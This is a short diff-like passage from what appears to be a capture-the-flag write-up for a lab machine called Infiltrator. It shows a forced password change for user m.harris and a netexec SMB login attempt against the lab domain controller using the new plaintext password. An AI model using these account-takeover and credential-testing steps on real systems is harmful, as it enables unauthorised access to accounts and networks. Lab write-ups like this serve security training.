@@ -1,0 +1,1 @@
+assword m.harris "0xdf0xdf!" [+] Password changed successfully! The creds for M.Harris have the same restrictions as D.Anderson: oxdf@hacky$ netexec smb infiltrator.htb -u m.harris -p '0xdf0xdf!' SMB 10.10.11.31 445 DC01 [*] Windows 10
